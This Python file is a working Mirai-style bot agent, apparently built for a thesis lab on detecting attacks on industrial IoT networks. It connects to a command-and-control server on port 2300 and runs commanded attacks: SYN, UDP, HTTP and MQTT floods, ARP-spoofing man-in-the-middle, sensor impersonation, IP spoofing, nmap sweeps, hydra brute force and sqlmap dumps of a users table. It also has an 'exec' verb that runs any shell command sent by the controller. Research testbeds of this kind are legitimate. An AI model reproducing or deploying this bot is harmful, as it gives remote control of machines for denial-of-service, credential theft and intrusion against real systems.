"""
Mirai-style bot agent. Connects to the C2 on :2300, registers, then waits
for commands and executes them locally. Bots are pure executors — every
attack class in the thesis matrix is C2-driven (no operator-on-bot actions).

Supported commands (sent by C2 broadcast or targeted to a specific bot):

  Volumetric / network
    syn   <ip> <port> <secs>           SYN flood (scapy)
    udp   <ip> <port> <secs>           UDP flood (hping3)
    http  <ip>        <secs>           Slow-HTTP / Slowloris (slowhttptest)
    mirai <ip>                         Full Mirai chain (scan+brute+flood)
    mitm  <victim> <gw>                ARP-spoof MITM (ettercap, 30s)

  Recon / brute / web / vuln (the new C2-driven verbs)
    recon <ip_or_subnet>               nmap SYN+version sweep on IIoT ports
    brute <ip> <service>               hydra brute force (service=ssh|telnet|ftp)
    web   <ip>                         sqlmap auto-exploit on /api/sensors?id=1
    nikto <ip>                         nikto web vuln scan
    exec  <shell command>              raw shell exec (for ad-hoc curl/etc.)
"""
import os, socket, subprocess, threading, time, shlex

BOT_ID  = os.environ.get("BOT_ID",  "bot_X")
C2_HOST = os.environ.get("C2_HOST", "192.168.1.100")
C2_PORT = int(os.environ.get("C2_PORT", "2300"))

# Default wordlists baked into the bot image
USERS_LIST = "/wordlists/users.txt"
PWORD_LIST = "/wordlists/pw.txt"


def _run(argv, timeout=None, name=""):
    """Run a subprocess, log start/finish, never raise."""
    print(f"[{BOT_ID}] $ {' '.join(argv)}", flush=True)
    try:
        r = subprocess.run(argv, check=False, timeout=timeout,
                           capture_output=True, text=True)
        if r.stdout:
            # Cap each tool's stdout to keep logs readable
            print(f"[{BOT_ID}] {name} stdout:\n{r.stdout[-2000:]}", flush=True)
        if r.stderr:
            print(f"[{BOT_ID}] {name} stderr:\n{r.stderr[-500:]}", flush=True)
    except subprocess.TimeoutExpired:
        print(f"[{BOT_ID}] {name} TIMEOUT after {timeout}s", flush=True)
    except Exception as e:
        print(f"[{BOT_ID}] {name} error: {e}", flush=True)


def run_attack(parts):
    """parts: e.g. ['syn','192.168.1.195','80','15']"""
    if not parts:
        return
    kind = parts[0]
    try:
        # ── Volumetric / network ─────────────────────────────────────────
        if kind == "syn" and len(parts) >= 4:
            ip, port, secs = parts[1], parts[2], parts[3]
            _run(["python3", "/attacks/synflood.py", ip, port,
                  "--duration", secs], name="syn")

        elif kind == "udp" and len(parts) >= 4:
            ip, port, secs = parts[1], parts[2], parts[3]
            _run(["timeout", secs, "hping3", "--udp", "--flood",
                  "-p", port, ip], name="udp")

        elif kind == "http" and len(parts) >= 3:
            ip, secs = parts[1], parts[2]
            _run(["timeout", secs, "slowhttptest",
                  "-c", "200", "-H", "-i", "10", "-r", "200",
                  "-t", "GET", "-u", f"http://{ip}/", "-x", "24", "-p", "3"],
                 name="slow-http")

        # ── Application-layer HTTP flood (actually kills 5%-CPU Flask) ──
        elif kind == "httpflood" and len(parts) >= 3:
            ip, secs = parts[1], parts[2]
            threads = parts[3] if len(parts) >= 4 else "250"
            _run(["python3", "/attacks/httpflood.py", ip, secs, threads],
                 timeout=int(secs) + 30, name="httpflood")

        # ── MQTT publish flood (real TCP MQTT, broker actually processes) ──
        elif kind == "mqttflood" and len(parts) >= 3:
            ip, secs = parts[1], parts[2]
            clients = parts[3] if len(parts) >= 4 else "50"
            size    = parts[4] if len(parts) >= 5 else "1024"
            _run(["python3", "/attacks/mqttflood.py", ip, secs, clients, size],
                 timeout=int(secs) + 30, name="mqttflood")

        elif kind == "mirai" and len(parts) >= 2:
            ip = parts[1]
            flood = parts[2] if len(parts) >= 3 else "15"
            _run(["python3", "/attacks/mirai_sim.py", ip,
                  "--flood-secs", flood], name="mirai")

        elif kind == "mitm" and len(parts) >= 3:
            victim, gw = parts[1], parts[2]
            _run(["timeout", "30", "python3", "/attacks/mitm.py",
                  victim, gw], name="mitm")

        # ── MITM family — ARP spoofing via ettercap ─────────────────────
        elif kind == "arpspoof" and len(parts) >= 3:
            target1, target2 = parts[1], parts[2]
            secs = parts[3] if len(parts) >= 4 else "30"
            _run(["timeout", secs, "ettercap", "-T", "-q", "-i", "eth0",
                  "-M", f"arp:remote",
                  f"/{target1}//", f"/{target2}//"],
                 timeout=int(secs) + 10, name="arpspoof-ettercap")

        # ── MITM family — Sensor Impersonation (data-integrity attack) ──
        elif kind == "impersonate" and len(parts) >= 3:
            broker, secs = parts[1], parts[2]
            sensor_id = parts[3] if len(parts) >= 4 else "weather_01"
            topic_pfx = parts[4] if len(parts) >= 5 else "iiot/weather"
            extreme   = parts[5] if len(parts) >= 6 else "true"
            _run(["python3", "/attacks/impersonate.py",
                  broker, secs, sensor_id, topic_pfx, extreme],
                 timeout=int(secs) + 30, name="impersonate")

        # ── MITM family — IP Spoofing ───────────────────────────────────
        elif kind == "ipspoof" and len(parts) >= 4:
            target, port, secs = parts[1], parts[2], parts[3]
            subnet = parts[4] if len(parts) >= 5 else "192.168.1"
            _run(["python3", "/attacks/ipspoof.py",
                  target, port, secs, subnet],
                 timeout=int(secs) + 30, name="ipspoof")

        # ── Recon ────────────────────────────────────────────────────────
        elif kind == "recon" and len(parts) >= 2:
            target = parts[1]
            # Aggressive SYN sweep (--min-rate 800 guarantees enough volume
            # to trip the RADM anomaly detector). Then a slower -sV pass to
            # produce a realistic recon footprint in the bot log.
            _run(["nmap", "-sS", "-T5", "--min-rate", "800",
                  "-p", "21,22,23,53,80,443,1883,2323,3306,5000,8080,8443",
                  "--open", target],
                 timeout=120, name="recon-sweep")
            _run(["nmap", "-sV", "-T4",
                  "-p", "22,23,80,1883",
                  "--open", target],
                 timeout=120, name="recon-version")

        # ── Brute force ──────────────────────────────────────────────────
        elif kind == "brute" and len(parts) >= 3:
            ip, service = parts[1], parts[2].lower()
            port_map = {"ssh": "22", "telnet": "23", "ftp": "21"}
            if service not in port_map:
                print(f"[{BOT_ID}] brute: unsupported service '{service}'", flush=True)
                return
            _run(["hydra", "-L", USERS_LIST, "-P", PWORD_LIST,
                  "-t", "4", "-f", "-I",
                  "-s", port_map[service], ip, service],
                 timeout=120, name=f"hydra-{service}")

        # ── Web exploitation ─────────────────────────────────────────────
        elif kind == "web" and len(parts) >= 2:
            ip = parts[1]
            # sqlmap on the deliberately-vulnerable endpoint. The Flask
            # portal runs with only 128 MB / 5 % CPU (IoT-class limits),
            # so we restrict sqlmap to Boolean + UNION techniques only
            # (no heavy time-based) and a single thread to avoid crashing
            # the target. This is fast (~20 s) and produces a clean
            # users-table dump.
            _run(["sqlmap", "-u", f"http://{ip}/api/sensors?id=1",
                  "--batch", "--technique=BU", "--threads=1",
                  "--dbs", "--tables", "--dump",
                  "-D", "main", "-T", "users",
                  "--flush-session"],
                 timeout=120, name="sqlmap")

        # ── Web vuln scanner ─────────────────────────────────────────────
        elif kind == "nikto" and len(parts) >= 2:
            ip = parts[1]
            _run(["nikto", "-h", f"http://{ip}", "-maxtime", "60s"],
                 timeout=90, name="nikto")

        # ── Raw shell escape hatch (ad-hoc curl, ping, etc.) ─────────────
        elif kind == "exec" and len(parts) >= 2:
            shell_cmd = " ".join(parts[1:])
            print(f"[{BOT_ID}] $ {shell_cmd}", flush=True)
            r = subprocess.run(shell_cmd, shell=True, check=False,
                               capture_output=True, text=True, timeout=60)
            if r.stdout: print(f"[{BOT_ID}] exec stdout:\n{r.stdout[-2000:]}", flush=True)
            if r.stderr: print(f"[{BOT_ID}] exec stderr:\n{r.stderr[-500:]}", flush=True)

        else:
            print(f"[{BOT_ID}] unknown/incomplete cmd: {parts}", flush=True)

    except Exception as e:
        print(f"[{BOT_ID}] attack error: {e}", flush=True)


# ── known attack verbs (kept here so it's easy to extend) ─────────────────
_ATTACK_VERBS = ("syn ", "udp ", "http ", "httpflood ", "mqttflood ",
                 "mirai ", "mitm ", "arpspoof ", "impersonate ",
                 "ipspoof ", "recon ", "brute ", "web ", "nikto ", "exec ")


def main():
    while True:
        try:
            print(f"[{BOT_ID}] connecting to C2 {C2_HOST}:{C2_PORT} ...", flush=True)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            s.sendall(f"REGISTER {BOT_ID}\n".encode())
            buf = b""
            while True:
                data = s.recv(256)
                if not data: break
                buf += data
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    cmd = line.decode(errors="ignore").strip()
                    if not cmd: continue
                    print(f"[{BOT_ID}] <- {cmd}", flush=True)
                    if cmd == "PING":
                        s.sendall(b"PONG\n")
                    elif cmd == "WELCOME":
                        pass
                    elif any(cmd.startswith(v) for v in _ATTACK_VERBS):
                        # shlex so quoted exec strings survive
                        parts = shlex.split(cmd)
                        threading.Thread(target=run_attack,
                                         args=(parts,),
                                         daemon=True).start()
                    else:
                        print(f"[{BOT_ID}] ignoring: {cmd}", flush=True)
            s.close()
        except Exception as e:
            print(f"[{BOT_ID}] C2 connection lost: {e}", flush=True)
        time.sleep(5)


if __name__ == "__main__":
    main()
